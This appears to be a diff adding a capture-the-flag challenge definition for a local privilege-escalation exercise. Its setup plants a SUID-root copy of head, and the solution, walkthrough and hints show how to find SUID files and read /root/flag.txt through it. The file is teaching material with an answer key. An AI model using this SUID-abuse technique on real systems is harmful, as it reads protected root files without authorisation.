@@ -1,0 +1,41 @@
+title: A reader that forgets who you are
+level: Advanced
+kind: Privilege escalation
+points: 80
+order: 22
+answer: flag
+
+@intro
+An administrator left a set-user-ID copy of a text tool on this box, owned by root.
+Because it runs as root, it reads files you can't. Find it and use it to read
+/root/flag.txt. You are the user player.
+
+@setup
+useradd -m player 2>/dev/null || true
+printf '%s\n' '{{FLAG}}' > /root/flag.txt
+chmod 600 /root/flag.txt
+install -m0755 /usr/bin/head /usr/local/bin/peek
+chown root: /usr/local/bin/peek
+chmod u+s /usr/local/bin/peek
+
+@solution
+find / -perm -4000 -type f 2>/dev/null
+ls -l /usr/local/bin/peek
+cat /root/flag.txt
+peek -n 100 /root/flag.txt
+
+@walkthrough
+find / -perm -4000 lists set-user-ID files. Among the normal ones (passwd, sudo...)
+is /usr/local/bin/peek, a copy of head. Because it runs as its owner root, it reads
+root's files:
+
+    cat /root/flag.txt            # Permission denied for you
+    peek -n 100 /root/flag.txt    # peek runs as root and reads it
+
+The lesson: never set the SUID bit on a tool that reads or writes arbitrary files.
+
+@hint 12
+find / -perm -4000 -type f finds the set-user-ID programs. One is not a standard one.
+
+@hint 20
+The program is /usr/local/bin/peek (a copy of head). Run: peek /root/flag.txt
